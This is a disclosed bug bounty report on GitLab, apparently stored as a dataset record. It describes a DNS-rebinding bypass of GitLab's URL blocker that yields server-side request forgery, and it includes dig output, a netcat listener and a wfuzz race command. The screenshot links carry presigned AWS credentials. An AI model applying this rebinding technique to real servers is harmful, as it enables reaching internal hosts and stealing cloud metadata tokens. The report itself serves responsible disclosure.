{
  "reported_to": "GitLab",
  "reported_by": "ajxchapman ",
  "title": "GitLab::UrlBlocker validation bypass leading to full Server Side Request Forgery",
  "content": "\nSummary\nThe GitLab::UrlBlocker IP address validation methods suffer from a Time of Check to Time of Use (ToCToU) vulnerability. The vulnerability occurs due to multiple DNS resolution requests performed before and after the checks. This issue allows a malicious authenticated user to send GET and POST HTTP requests to arbitrary hosts, including the localhost, cloud metadata services and the local network, and read the HTTP response.\nDetails\nThe IP address validation code in /lib/gitlab/url_blocker.rb resolves the IP addresses of the provided URL domain, raises an exception if the resolved IP addresses match addresses in block lists (127.0.0.1, ::1, 169.254.0.0/16, etc.) or returns true if the IP address do not match the block lists.\nCode 450 Bytes\n1  begin\n2    addrs_info = Addrinfo.getaddrinfo(uri.hostname, port, nil, :STREAM).map do |addr|\n3      addr.ipv6_v4mapped? ? addr.ipv6_to_ipv4 : addr\n4    end\n5  rescue SocketError\n6    return true\n7  end\n8\n9  validate_localhost!(addrs_info) unless allow_localhost\n10  validate_loopback!(addrs_info) unless allow_localhost\n11  validate_local_network!(addrs_info) unless allow_local_network\n12  validate_link_local!(addrs_info) unless allow_local_network\n13\n14  true\n15end\nIf the address validates the GitLab::HTTP code then uses HTTParty to request the URL, which performs a second URL domain DNS resolution. The address validation checks can be bypassed if the URL domain resolves to a valid address for the first resolution then a forbidden address after the checks are performed.\nIn order to perform this attack a DNS server must be configured to resolve a domain to alternating addresses with a low (or zero) Time To Live. To demonstrate this issue I used my researchersservers project (https://github.com/ajxchapman/sshreverseshell) with the configuration in 41_gitlab.json (F470655). Output of resolving gitlabextssrf.webhooks.pw against this DNS resolver configuration is shown below:\nCode 542 Bytes\n1$ dig +noall +answer gitlabextssrf.webhooks.pw\n2gitlabextssrf.webhooks.pw. 0    IN      A       198.211.125.160\n3$ dig +noall +answer gitlabextssrf.webhooks.pw\n4gitlabextssrf.webhooks.pw. 0    IN      A       198.211.125.160\n5$ dig +noall +answer gitlabextssrf.webhooks.pw\n6gitlabextssrf.webhooks.pw. 0    IN      A       127.0.0.1\n7$ dig +noall +answer gitlabextssrf.webhooks.pw\n8gitlabextssrf.webhooks.pw. 0    IN      A       127.0.0.1\n9$ dig +noall +answer gitlabextssrf.webhooks.pw\n10gitlabextssrf.webhooks.pw. 0    IN      A       198.211.125.160\nNotice the alternating resolved IP address and 0 ttl.\nAttack scenario\n<image_0>\nSteps to reproduce\nTo demonstrate this issue I have configured the domain gitladextssrf.webhooks.pw to randomly resolve to either 198.211.125.160 or 127.0.0.1.\nCreate a new repository\nAdd a commit to the repository\nCreate a new Web Hook integration with the URL http://gitlabextssrf.webhooks.pw:9999.\nThis may take several attempts due to the random nature of the gitlabextssrf.webhooks.pw DNS resolver, if it fails with a 500 error, try again until it is accepted.\nLog into the gitlab server and start a TCP listener on port 9999/tcp (e.g. nc -vvn -l -p 9999)\nPerform numerous parallel requests to the Web Hook test endpoint. For this I use wfuzz\nCode 213 Bytes\n1$ ./wfuzz -X POST \\\n2  -b \"_gitlab_session=<session_id>;\" \\\n3  -d \"_method=post&authenticity_token=<token>\" \\\n4  -z range,0-1000 \\\n5  \"https://<domain>/<user>/<repo>/hooks/<hook_id>/test?trigger=push_events&test=FUZZ\"\nAfter several requests a connection will be made to the local TCP listener on port 9999/tcp.\nImpact\nThis issue allows a malicious authenticated user to send GET and POST HTTP requests from the GitLab server to arbitrary hosts (including the localhost, cloud metadata services and the local network) with arbitrary paths, and read the HTTP response. This could be abused to compromise the host (e.g. leaking AWS tokens from the metadata service), or perform reconnaissance and exploitation of hosts on the local network.\nWhat is the current bug behavior?\nThe GitLab::UrlBlocker validation code resolves the IP addresses of a URL domain, validates them against a series of block lists, and if valid returns to the GitLab::HTTP module which re-resolves the URL domain in order to perform the HTTP request.\nWhat is the expected correct behavior?\nThe validated resolved addresses should be returned by GitLab::UrlBlocker and used by GitLab::HTTP to make the TCP connection to the destination host.\nRelevant logs and/or screenshots\n<image_1>\nOutput of checks\nResults of GitLab environment info\nCode 1.00 KiB\n1$ gitlab-rake gitlab:env:info\n2\n3System information\n4System:         Ubuntu 18.04\n5Proxy:          no\n6Current User:   git\n7Using RVM:      no\n8Ruby Version:   2.5.3p105\n9Gem Version:    2.7.6\n10Bundler Version:1.16.6\n11Rake Version:   12.3.2\n12Redis Version:  3.2.12\n13Git Version:    2.18.1\n14Sidekiq Version:5.2.5\n15Go Version:     unknown\n16\n17GitLab information\n18Version:        11.9.8-ee\n19Revision:       c9701808101\n20Directory:      /opt/gitlab/embedded/service/gitlab-rails\n21DB Adapter:     postgresql\n22DB Version:     9.6.11\n23URL:            https://gitlabext.webhooks.pw\n24HTTP Clone URL: https://gitlabext.webhooks.pw/some-group/some-project.git\n25SSH Clone URL:  git@gitlabext.webhooks.pw:some-group/some-project.git\n26Elasticsearch:  no\n27Geo:            no\n28Using LDAP:     no\n29Using Omniauth: yes\n30Omniauth Providers:\n31\n32GitLab Shell\n33Version:        8.7.1\n34Repository storage paths:\n35- default:      /var/opt/gitlab/git-data/repositories\n36GitLab Shell path:              /opt/gitlab/embedded/service/gitlab-shell\n37Git:            /opt/gitlab/embedded/bin/git\nI have confirmed this issue on both the official Docker image and the official gitlab-ee Ubuntu package (using installation instructions from https://about.gitlab.com/install/#ubuntu).\nImpact\nThis issue allows a malicious authenticated user to send GET and POST HTTP requests from the GitLab server to arbitrary hosts (including the localhost, cloud metadata services and the local network) with arbitrary paths, and read the HTTP response. This could be abused to compromise the host (e.g. leaking AWS tokens from the metadata service), or perform reconnaissance and exploitation of hosts on the local network.\n\n",
  "severity": [
    7.6,
    null
  ],
  "bounty": 5000,
  "weaknesses": [
    "Server-Side Request Forgery (SSRF)"
  ],
  "screenshots": {
    "image_0": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/470/641/30a1794b8ace50c8dab24743c5eb0336b4e3366f/Screenshot_from_2019-04-17_09-18-49.png?response-content-disposition=attachment%3B%20filename%3D%22Screenshot_from_2019-04-17_09-18-49.png%22%3B%20filename%2A%3DUTF-8%27%27Screenshot_from_2019-04-17_09-18-49.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ5GHIQOIO%2F20250326%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250326T021237Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjELf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIGnzKZJrjntY2y%2FhGCDYApEGCf4rNojJCSPmBgWJNM%2BFAiBVVfjcSUJsmv9nOfbcFcqNnTR2VI12gld1QHPIEKIi%2FCqyBQggEAMaDDAxMzYxOTI3NDg0OSIMyAk2FQoaJglwwF03Ko8FCBBM%2Fp%2BbQhlo%2B4k3r%2BjfU2t8SOZ5jrFMkPANoyghH%2BaxKXRKgtpF4dkPve%2BdHc3GpmN3M2Us2NwBZ%2FJp1er02KkM32Ejso2yCGo09UqyFOxzN57qifmjUUUY9bQqj1pJOk%2BBJkCllv95wMA%2F6fKhseqvDHC%2BQww4JfD0kTOcaBqZBhrLVwrs93xP6biYeZbD4%2FYB3FofqpHKb9EJ%2BJgEZYFDFfcMEx2PcOp1XpaT5IVoRUBl9OUoICC3TIC8QzOIsoMtyEjw2N%2BzTmut89SYkiWp0NMELRQ8il0j3pahL7PTc0CUj9Oe3BygsuGhbggSqGCqRLGbdvrT4CcsInoG8znPGAb4zAGStWPMkzCRL1ziMZAviBOY1GQTqx1xEb4bjEHrk6OmMODqpL%2F3qS6JSVhg8nPj8MSe6vOnW3oMf%2FDJYHhwxBVfETvx6y3AIdN8WXCr1wmqooOVbwnJB2OORDIZIEe2DtGHNSaaWv%2BX2wwnSkwJEXuDpeHzm%2FF2EJTEGQsrS0d5aF4x9REmZuo3YtD6oP1yLrpJdXS9ilLQ8%2B57MfKZx3P759Ya%2BrznJW34LfsYkg1AJg7TI9wAguQDPKdd1d2SW0%2BvoRGIOUXJWQsU2O%2BNDXEXXyUQCA%2Fp8t0tQBN0bvNMV2ol8IfwEYuRrub68sl%2B%2BzLZAcpHw5QyR1y9El%2FUYooCqF7rLbBWypGnIfLA7GaNuAmLzL8Ofg4JegDsp%2FiDa3dL2lYyMUZRgMmKBI1ZfyukjFY26ydnlHSQwtVnATwduRT9A4eilfZaFkuXRnyFxWbtkxbTiXB1d%2Fe4O3yLAfjD9LsFiLRliQjzoaRW4xvEglRjl4u0R7S3kkJ%2BFQdxdrt4MUZDZS6MpDD%2F54y%2FBjqyAW134M4QyN8WJtdx4Cf07nz4H2peEFwAZTeVr%2FDGUo15TrmmKavSrqUAa4hFOI2pSA4MFCfKv1Rskr0nvfUHoqFWTiyJ0eDjR1PzRFxLQxfW4%2FWFahJowL%2B0yE4GCUP0nwGTycuhz23FH350CADEf3TXrnKDQF%2BqJo9n%2FlKC0zhMviM%2FhyqlF1j1CvtMwhb4Gi3eyMvm5HEIT5LpoysH9rwaLQvCBymbPXOfJlxBupdA0JA%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=9ceff7cce0c362d58632f7960d90f2afd22e47e010ab2a25f93e4956af93810d",
    "image_1": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/470/641/30a1794b8ace50c8dab24743c5eb0336b4e3366f/Screenshot_from_2019-04-17_09-18-49.png?response-content-disposition=attachment%3B%20filename%3D%22Screenshot_from_2019-04-17_09-18-49.png%22%3B%20filename%2A%3DUTF-8%27%27Screenshot_from_2019-04-17_09-18-49.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ5GHIQOIO%2F20250326%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250326T021237Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjELf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIGnzKZJrjntY2y%2FhGCDYApEGCf4rNojJCSPmBgWJNM%2BFAiBVVfjcSUJsmv9nOfbcFcqNnTR2VI12gld1QHPIEKIi%2FCqyBQggEAMaDDAxMzYxOTI3NDg0OSIMyAk2FQoaJglwwF03Ko8FCBBM%2Fp%2BbQhlo%2B4k3r%2BjfU2t8SOZ5jrFMkPANoyghH%2BaxKXRKgtpF4dkPve%2BdHc3GpmN3M2Us2NwBZ%2FJp1er02KkM32Ejso2yCGo09UqyFOxzN57qifmjUUUY9bQqj1pJOk%2BBJkCllv95wMA%2F6fKhseqvDHC%2BQww4JfD0kTOcaBqZBhrLVwrs93xP6biYeZbD4%2FYB3FofqpHKb9EJ%2BJgEZYFDFfcMEx2PcOp1XpaT5IVoRUBl9OUoICC3TIC8QzOIsoMtyEjw2N%2BzTmut89SYkiWp0NMELRQ8il0j3pahL7PTc0CUj9Oe3BygsuGhbggSqGCqRLGbdvrT4CcsInoG8znPGAb4zAGStWPMkzCRL1ziMZAviBOY1GQTqx1xEb4bjEHrk6OmMODqpL%2F3qS6JSVhg8nPj8MSe6vOnW3oMf%2FDJYHhwxBVfETvx6y3AIdN8WXCr1wmqooOVbwnJB2OORDIZIEe2DtGHNSaaWv%2BX2wwnSkwJEXuDpeHzm%2FF2EJTEGQsrS0d5aF4x9REmZuo3YtD6oP1yLrpJdXS9ilLQ8%2B57MfKZx3P759Ya%2BrznJW34LfsYkg1AJg7TI9wAguQDPKdd1d2SW0%2BvoRGIOUXJWQsU2O%2BNDXEXXyUQCA%2Fp8t0tQBN0bvNMV2ol8IfwEYuRrub68sl%2B%2BzLZAcpHw5QyR1y9El%2FUYooCqF7rLbBWypGnIfLA7GaNuAmLzL8Ofg4JegDsp%2FiDa3dL2lYyMUZRgMmKBI1ZfyukjFY26ydnlHSQwtVnATwduRT9A4eilfZaFkuXRnyFxWbtkxbTiXB1d%2Fe4O3yLAfjD9LsFiLRliQjzoaRW4xvEglRjl4u0R7S3kkJ%2BFQdxdrt4MUZDZS6MpDD%2F54y%2FBjqyAW134M4QyN8WJtdx4Cf07nz4H2peEFwAZTeVr%2FDGUo15TrmmKavSrqUAa4hFOI2pSA4MFCfKv1Rskr0nvfUHoqFWTiyJ0eDjR1PzRFxLQxfW4%2FWFahJowL%2B0yE4GCUP0nwGTycuhz23FH350CADEf3TXrnKDQF%2BqJo9n%2FlKC0zhMviM%2FhyqlF1j1CvtMwhb4Gi3eyMvm5HEIT5LpoysH9rwaLQvCBymbPXOfJlxBupdA0JA%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=9ceff7cce0c362d58632f7960d90f2afd22e47e010ab2a25f93e4956af93810d"
  },
  "disclosed_date": 1576169760,
  "report_url": "https://hackerone.com/reports/541169",
  "is_multi_component": true,
  "complexity": "HIGH",
  "novelty": "HIGH",
  "vuln_category": "WEB_APP",
  "steps": [
    [
      1,
      "Create a new repository and add a commit to it"
    ],
    [
      2,
      "Create a new Web Hook integration with a URL pointing to a domain that alternates DNS resolution between a valid IP and a forbidden IP (e.g., 127.0.0.1)"
    ],
    [
      3,
      "Set up a TCP listener on the GitLab server on the port specified in the Web Hook URL"
    ],
    [
      4,
      "Perform numerous parallel requests to the Web Hook test endpoint to trigger the SSRF"
    ]
  ],
  "vuln_description": "The GitLab::UrlBlocker validation suffers from a Time of Check to Time of Use (ToCToU) vulnerability due to multiple DNS resolution requests before and after checks. This allows an authenticated user to bypass IP validation and perform Server-Side Request Forgery (SSRF) to arbitrary hosts, including localhost, cloud metadata services, and local network.",
  "reason": "This vulnerability requires understanding DNS resolution timing attacks, the GitLab::UrlBlocker validation flow, and the ability to manipulate DNS responses to alternate between valid and forbidden IPs. The attack also involves setting up a custom DNS server and performing parallel requests to exploit the race condition.",
  "new_complexity": "HIGH",
  "requires_code": true,
  "requires_CVE": false,
  "is_ctf": false,
  "other_report": null
}